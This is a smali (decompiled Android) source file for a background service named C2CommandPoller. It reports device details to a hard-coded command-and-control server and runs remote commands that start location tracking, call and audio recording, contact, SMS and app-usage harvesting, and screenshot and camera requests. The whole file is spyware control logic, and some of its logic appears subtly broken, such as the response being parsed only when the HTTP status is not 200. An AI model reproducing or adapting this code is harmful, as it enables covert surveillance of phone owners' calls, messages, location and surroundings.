.class public Lcom/smilex/enhanced/services/C2CommandPoller;
.super Landroid/app/Service;
.source "C2CommandPoller.java"

.field private static final POLL_INTERVAL_MS:J = 0xea60L
.field private static final C2_POLL_URL:Ljava/lang/String; = "https://smilex-c2.onrender.com/api/c2"
.field private mPollTimer:Ljava/util/Timer;
.field mBinder:Landroid/os/IBinder;

.method public constructor <init>()V
    .registers 2
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onCreate()V
    .registers 3
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    new-instance v0, Ljava/util/Timer;
    invoke-direct {v0}, Ljava/util/Timer;-><init>()V
    iput-object v0, p0, Lcom/smilex/enhanced/services/C2CommandPoller;->mPollTimer:Ljava/util/Timer;
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 7
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I
    invoke-virtual {p0}, Lcom/smilex/enhanced/services/C2CommandPoller;->startPolling()V
    const/4 v0, 0x1
    return v0
.end method

.method public onDestroy()V
    .registers 2
    invoke-virtual {p0}, Lcom/smilex/enhanced/services/C2CommandPoller;->stopPolling()V
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3
    const/4 v0, 0x0
    return-object v0
.end method

.method private startPolling()V
    .registers 5
    iget-object v0, p0, Lcom/smilex/enhanced/services/C2CommandPoller;->mPollTimer:Ljava/util/Timer;
    if-eqz v0, :return
    new-instance v0, Lcom/smilex/enhanced/services/C2CommandPoller$PollTask;
    invoke-direct {v0, p0}, Lcom/smilex/enhanced/services/C2CommandPoller$PollTask;-><init>(Lcom/smilex/enhanced/services/C2CommandPoller;)V
    iget-object v1, p0, Lcom/smilex/enhanced/services/C2CommandPoller;->mPollTimer:Ljava/util/Timer;
    const-wide/16 v2, 0x0
    invoke-virtual {v1, v0, v2, v3}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V
    :return
    return-void
.end method

.method private stopPolling()V
    .registers 2
    iget-object v0, p0, Lcom/smilex/enhanced/services/C2CommandPoller;->mPollTimer:Ljava/util/Timer;
    if-eqz v0, :return
    iget-object v0, p0, Lcom/smilex/enhanced/services/C2CommandPoller;->mPollTimer:Ljava/util/Timer;
    invoke-virtual {v0}, Ljava/util/Timer;->cancel()V
    const/4 v0, 0x0
    iput-object v0, p0, Lcom/smilex/enhanced/services/C2CommandPoller;->mPollTimer:Ljava/util/Timer;
    :return
    return-void
.end method

.method static synthetic access$000(Lcom/smilex/enhanced/services/C2CommandPoller;)V
    .registers 2
    invoke-direct {p0}, Lcom/smilex/enhanced/services/C2CommandPoller;->pollForCommands()V
    return-void
.end method

.method private pollForCommands()V
    .registers 9
    :try_start
    new-instance v0, Ljava/net/URL;
    const-string v1, "https://smilex-c2.onrender.com/api/c2"
    invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v0
    check-cast v0, Ljava/net/HttpURLConnection;

    const-string v1, "POST"
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
    const/4 v1, 0x1
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
    const-string v1, "Content-Type"
    const-string v2, "application/json"
    invoke-virtual {v0, v1, v2}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
    const/16 v1, 0x3a98
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V
    const/16 v1, 0x7530
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    new-instance v1, Ljava/lang/StringBuilder;
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V
    const-string v2, "{\"device_id\":\""
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-static {p0}, Lcom/smilex/enhanced/utils/CryptoUtils;->generateDeviceId()Ljava/lang/String;
    move-result-object v2
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v2, "\",\"model\":\""
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    sget-object v2, Landroid/os/Build;->MODEL:Ljava/lang/String;
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v2, "\",\"android_version\":\""
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    sget-object v2, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v2, "\"}"
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v2
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v3
    invoke-virtual {v3}, Ljava/lang/String;->getBytes()[B
    move-result-object v3
    invoke-virtual {v2, v3}, Ljava/io/OutputStream;->write([B)V
    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I
    move-result v1
    const/16 v2, 0xc8
    if-eq v1, v2, :close

    new-instance v1, Ljava/io/BufferedReader;
    new-instance v2, Ljava/io/InputStreamReader;
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;
    move-result-object v3
    invoke-direct {v2, v3}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V
    invoke-direct {v1, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    new-instance v2, Ljava/lang/StringBuilder;
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    :loop
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    move-result-object v3
    if-eqz v3, :parse

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    goto :loop

    :parse
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->length()I
    move-result v4
    if-lez v4, :close

    invoke-virtual {p0, v3}, Lcom/smilex/enhanced/services/C2CommandPoller;->executeCommand(Ljava/lang/String;)V

    :close
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :error
    return-void

    :error
    move-exception v0
    const-string v1, "C2CommandPoller"
    const-string v2, "Poll failed"
    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    return-void
.end method

.method public executeCommand(Ljava/lang/String;)V
    .registers 6
    :try_start
    new-instance v0, Lorg/json/JSONObject;
    invoke-direct {v0, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v1, "commands"
    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;
    move-result-object v0

    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I
    move-result v1
    if-lez v1, :end

    const/4 v1, 0x0
    invoke-virtual {v0, v1}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;
    move-result-object v0

    const-string v1, "cmd"
    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v1

    const-string v2, "args"
    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v2

    if-eqz v1, :end

    const-string v3, "start_location"
    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v3
    if-eqz v3, :cmd_call

    new-instance v3, Landroid/content/Intent;
    const-class v4, Lcom/smilex/enhanced/services/LocationService;
    invoke-direct {v3, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v3}, Lcom/smilex/enhanced/services/C2CommandPoller;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    goto :end

    :cmd_call
    const-string v3, "start_call_record"
    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v3
    if-eqz v3, :cmd_audio

    new-instance v3, Landroid/content/Intent;
    const-class v4, Lcom/smilex/enhanced/services/CallRecorderService;
    invoke-direct {v3, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    const-string v4, "action"
    const-string v5, "START_RECORDING"
    invoke-virtual {v3, v4, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    invoke-virtual {p0, v3}, Lcom/smilex/enhanced/services/C2CommandPoller;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    goto :end

    :cmd_audio
    const-string v3, "start_audio"
    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v3
    if-eqz v3, :cmd_contacts

    invoke-static {p0}, Lcom/smilex/enhanced/modules/AudioModule;->startRecording(Landroid/content/Context;)V
    goto :end

    :cmd_contacts
    const-string v3, "sync_contacts"
    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v3
    if-eqz v3, :cmd_appusage

    invoke-static {p0}, Lcom/smilex/enhanced/modules/ContactsModule;->init(Landroid/content/Context;)V
    goto :end

    :cmd_appusage
    const-string v3, "sync_appusage"
    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v3
    if-eqz v3, :cmd_screenshot

    invoke-static {p0}, Lcom/smilex/enhanced/modules/AppUsageModule;->init(Landroid/content/Context;)V
    goto :end

    :cmd_screenshot
    const-string v3, "take_screenshot"
    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v3
    if-eqz v3, :cmd_sms

    const-string v3, "screencap"
    const-string v4, "requested"
    invoke-static {v3, v4}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
    goto :end

    :cmd_sms
    const-string v3, "sync_sms"
    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v3
    if-eqz v3, :cmd_camera

    new-instance v3, Landroid/content/Intent;
    const-class v4, Lcom/smilex/enhanced/modules/SmsModule;
    invoke-direct {v3, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v3}, Lcom/smilex/enhanced/services/C2CommandPoller;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    goto :end

    :cmd_camera
    const-string v3, "capture_photo"
    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v3
    if-eqz v3, :cmd_stop

    const-string v3, "camera"
    const-string v4, "capture_requested"
    invoke-static {v3, v4}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
    goto :end

    :cmd_stop
    const-string v3, "stop_all"
    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v3
    if-eqz v3, :end

    invoke-static {}, Lcom/smilex/enhanced/modules/AudioModule;->stopRecording()V

    :end
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :error
    return-void

    :error
    move-exception v0
    const-string v1, "C2CommandPoller"
    const-string v2, "Command execution failed"
    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    return-void
.end method
